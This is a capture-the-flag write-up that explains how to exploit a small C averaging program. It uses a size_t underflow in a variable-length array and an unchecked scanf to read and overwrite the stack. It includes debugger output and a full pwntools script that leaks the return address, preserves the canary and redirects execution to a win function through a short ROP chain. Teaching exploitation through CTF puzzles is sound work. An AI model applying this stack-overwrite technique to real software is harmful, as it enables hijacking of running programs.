# An Average Challenge -- Solution

The simple binary allows the user to enter some number of integers and proceeds to calculate their average.

Examination of the source code reveals two issues we can take advantage of:

1. Variable `n` used to store the number of players is an unsigned 64-bit integer, while the the variable length array is of size `n+1`. Providing SIZE_MAX (or simply -1) as the value of `n`, will overflow and allocate an VLA `score` of size 0 on stack and continue to read the integers in the for loop. 

2. There's no check on the value returned by the first `scanf`, if we give a string "n" as input when an integer is expected, `score[i]` will remain unchanged and "n" will be consumed by the subsequent `scanf`. This gives us the ability to read the array value and than either provide the same value or change it. 


```c
void vuln() {
  size_t n;
  printf("Enter number of players:\n");
  scanf("%lu", &n);

  int score[n+1];
  score[0] = 0;
  
  for (int i=1; i<=n; i++) {
    char response;
    do {
      printf("Enter score for player %d:\n", i);
      scanf("%d", &score[i]);
      printf("You entered %d. Is this ok (y, n)?:\n", score[i]);
      scanf(" %c", &response);
    } while (response != 'y');
  }

  int total = 0;
  for (int i=1; i<=n; i++) 
    total += score[i];
  printf("Average score is %lf.\n", total/(double)n);
}
```

Hence, we can examine and abitrarily change the stack frame of the `vuln` function. 

The plan is now to simply change the return address to point to the `win` function. Since [ASLR](https://ctf101.org/binary-exploitation/address-space-layout-randomization/) is used, we need to read the old return address and add the offset of the `win` function. Also, we must make sure not the modify the [stack canary](https://ctf101.org/binary-exploitation/stack-canaries/). Another, technical detail is that the stack pointer needs to be [aligned to a 16-byte boundary before function call](https://www.ctfnote.com/pwn/linux-exploitation/rop/stack-alignment). Hence, we need a mini [ROP](https://ctf101.org/binary-exploitation/return-oriented-programming/) chain instead of a direct return to the `win` function. Finally, we need to modify the value of local variable `n` in order for the loop to terminate.

The stack layout and the offsets are easily found using a debugger.

```
gef➤  telescope $rsp -l 0x10
0x007ffe23725050│+0x0000: 0x0000000000000000     ← $rbx, $rsp
0x007ffe23725058│+0x0008: 0x007f42dee0b760  →  0x00000000fbad2887
0x007ffe23725060│+0x0010: 0xffffffffffffffff
0x007ffe23725068│+0x0018: 0x0000000000000000
0x007ffe23725070│+0x0020: 0x007f42dee072a0  →  0x0000000000000000
0x007ffe23725078│+0x0028: 0x9f995a0b49077500
0x007ffe23725080│+0x0030: 0x007f42dee0b760  →  0x00000000fbad2887
0x007ffe23725088│+0x0038: 0x0000000000000000
0x007ffe23725090│+0x0040: 0x00558097000890  →  <_start+0> xor ebp, ebp
0x007ffe23725098│+0x0048: 0x007ffe237251a0  →  0x0000000000000001
0x007ffe237250a0│+0x0050: 0x0000000000000000
0x007ffe237250a8│+0x0058: 0x0000000000000000
0x007ffe237250b0│+0x0060: 0x007ffe237250c0  →  0x00558097000c40  →  <__libc_csu_init+0> push r15         ← $rbp
0x007ffe237250b8│+0x0068: 0x00558097000c33  →  <main+54> mov eax, 0x0
0x007ffe237250c0│+0x0070: 0x00558097000c40  →  <__libc_csu_init+0> push r15
0x007ffe237250c8│+0x0078: 0x007f42dea40c87  →  <__libc_start_main+231> mov edi, eax
gef➤  info address win
Symbol "win" is at 0x55809700099a in a file compiled without debugging.
gef➤  print 0x00558097000c33-0x55809700099a
$1 = 0x299
```

Putting it all together:
```python
#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 11114)
    else:
        p = process('./chall')
    return p

p = conn()

p.sendlineafter(b':', b'-1')
for i in range(33):
    p.sendlineafter(b':', b'n')
    p.recvuntil(b'You entered')
    v = p.recvuntil(b'.')
    v = int(v[:-1])
    print('{} {:08x}'.format(i, v))
    if i == 7:
        v = 33
    elif i == 8:
        v = 0
    elif i == 29:
        low = v
        v += 6
    elif i == 30:
        high = v
    elif i == 31:
        v = low - 0x299
    elif i == 32:
        v = high  
    p.sendlineafter(b':', str(v).encode('ascii'))
    p.sendlineafter(b'?:', b'y')

p.interactive()
```